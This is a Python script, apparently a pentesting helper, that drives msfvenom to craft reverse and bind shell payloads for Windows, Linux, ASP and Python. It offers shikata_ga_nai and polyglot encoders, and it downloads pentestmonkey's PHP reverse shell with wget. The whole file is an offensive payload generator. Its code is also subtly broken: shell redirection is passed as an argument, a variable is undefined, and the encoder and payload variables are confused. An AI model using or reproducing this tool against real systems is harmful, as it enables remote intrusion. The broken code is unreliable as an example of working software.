#!/usr/bin/env python
import subprocess
import sys
import os
'''
#################################################
# Very generic payload creator, only crafted for
# C, EXE, PHP, ASP, PY
#################################################
'''
def processor(process): #huge creds to phi10s 
    output=""
    while process.poll() is None:
    	readline=process.stdout.readline()
    	output+=readline
    	sys.stdout.write(readline)
    readline=process.stdout.read()
    output+=readline
    sys.stdout.write(readline)
    sys.stdout.flush()
    return output
typelist=['php', 'linux', 'windows', 'python', 'asp', 'PHP', 'Linux', 'Windows', 'Python', 'ASP']
payloadlist=['reverse', 'bind']
execution=['staged', 'non-staged']
encoder=['shikata', 'polyglot']

try:
	lhost=sys.argv[1]
	if lhost!='-h' and lhost!='php':
		lport=sys.argv[2]
		type=sys.argv[3]
		file=sys.argv[4]

	else:
		type=lhost
except IndexError:
	print('Example format (generic payloads. Please craft specific payloads manually):'
	+"\n./payload.py <host> <port> <type> <file> <payload> <execution> <encoder> <badbytes> <small>"
	+"\nPayload has to be defined for windows and linux"
	+"\nExecution has to be defined for windows linux and asp type reverse shell"
	+"\nPHP shell is downloaded from pentestmonkey into a tarball. Extract manually")
	print('\ntype -h for payload list')
	sys.exit(-1)

try:
	payload=sys.argv[5]
	execution=sys.argv[6]
	encoding=sys.argv[7]
	badbytes=sys.argv[8]
	smallest=sys.argv[9]
	if encoding=='shikata':
		payload='-e x86/shikata_ga_nai'
	if encoding=='polyglot':
		payload='-e x86/bmp_polyglot'
	if smallest=='small':
		smallest=' --smallest'
	if badbytes!=None:
		badbytes='-b '+badbytes
except IndexError:
	payload=''
	execution=''
	encoding=''
	badbytes=''
	smallest=''
 
if sys.argv[1]=='-h':
	print('./payload.py <host> <port> <type> <file> <payload> <execution> <encoder> <badbytes> <small>')
	print('\nAvailable payloads')
	print('\nWindows Payloads'
	+'\n----------------'
	+'\nReverse Shell'
	+'\nBind Shell'
	+'\n'
	+'\nLinux Payloads'
	+'\n----------------'
	+'\nReverse Shell'
	+'\nBind Shell'
	+'\nGeneric Shell'
	+'\n'
	+'\nWeb Payloads'
	+'\n----------------'
	+'\nReverse ASP Shell'
	+'\nReverse PHP Shell'
	+'\n'
	+'\nScript Payloads'
	+'\n----------------'
	+'\nReverse Python Shell'
	+"\n"
	+"\nTypes: php, linux, windows, python, asp, PHP, Linux, Windows, Python, ASP"
	+"\nPayloads: reverse, bind"
	+"\nExecution: staged, non-staged"
	+"\nEncoders: shikata, polyglot(x86_bmp)"
	+"\nBadBytes: If you don't know, you prolly don't need it"
	+"\nSmall: small"
	+"\n")
	sys.exit(-1)

windows_staged='windows/shell/reverse_tcp'
windows_non_staged='windows/shell_reverse_tcp'
windows_bind='windows/shell/bind_tcp'

linux_staged_86='linux/x86/shell/reverse_tcp'
linux_non_staged='linux/x86/shell_reverse_tcp'
linux_bind='linux/x86/shell/bind_tcp'


php='php/shell_reverse_tcp'

perl='cmd/unix/reverse_perl'
python='cmd/unix/reverse_python'
bash='cmd/unix/reverse_bash'

try:	
	if type=='windows' or type=='Windows':
		#windows payloads
		if payload=='reverse' and execution=='staged':
			subprocess.Popen(['msfvenom','-p',windows_staged,'LHOST='+lhost, 'LPORT='+lport , encoding, badbytes, smallest,'-f exe', '>', file+'.exe'])
			print('Payload crafted successfully at',file+'.exe')
	
		elif payload=='reverse' and execution=='non-staged':
			subprocess.Popen(['msfvenom','-p',windows_non_staged,'LHOST='+lhost, 'LPORT='+lport , encoding, badbytes, smallest, '-f exe', '>', file+'.exe'])
			print('Payload crafted successfully at',file+'.exe')
	
		elif payload=='bind':
			subprocess.Popen(['msfvenom','-p',windows_bind,'RHOST='+lhost, 'RPORT='+lport , encoding, badbytes, smallest, '-f exe', '>', file+'.exe'])
			print('Payload crafted successfully at',file+'.exe')
	if type=='linux' or type=='Linux':		
		#linux payloads
		if payload=='reverse' and execution=='staged':
			subprocess.Popen(['msfvenom','-p',linux_staged,'LHOST='+lhost, 'LPORT='+lport , badbytes, smallest,'-f elf', '>', file+'.elf'])
			print('Payload crafted successfully at',file+'.elf')
			
		elif payload=='reverse' and execution=='non-staged':
			subprocess.Popen(['msfvenom','-p',linux_non_staged,'LHOST='+lhost, 'LPORT='+lport , badbytes, smallest, '-f elf', '>', file+'.elf'])
			print('Payload crafted successfully at',file+'.elf')
	
		elif payload=='bind' and type=='linux':
			subprocess.Popen(['msfvenom','-p',linux_bind,'RHOST='+lhost, 'RPORT='+lport , badbytes, smallest, '-f elf', '>', file+'.elf'])
			print('Payload crafted successfully at',file+'.elf')

	
	if type=='asp' or type == 'ASP':
		#Web payloads
		if execution=='staged':
			subprocess.Popen(['msfvenom','-p',windows_staged,'LHOST='+lhost, 'LPORT='+lport , encoding, badbytes, smallest, '-f asp', '>', file+'.asp'])
			print('Payload crafted successfully at',file+'.asp')
	
		elif execution=='non-staged':
			subprocess.Popen(['msfvenom','-p',windows_non_staged,'LHOST='+lhost, 'LPORT='+lport , encoding, badbytes, smallest,'-f asp', '>', file+'.asp'])
			print('Payload crafted successfully at',file+'.asp')

	elif type=='php' or type=='PHP':
		processor(subprocess.Popen(['wget','http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz'], stdout=subprocess.PIPE))
		print('Payload downloaded successfully')

	#Script payloads

	elif type=='python' or type=='Python':
		subprocess.Popen(['msfvenom','-p',python,'LHOST='+lhost, 'LPORT='+lport , '-f raw', '>', file+'.py'])
		print('Payload crafted successfully at',file+'.py')

except Exception as e:
	raise
	print('Failed to craft payload. Please check your format or report any bugs(jk)')
	
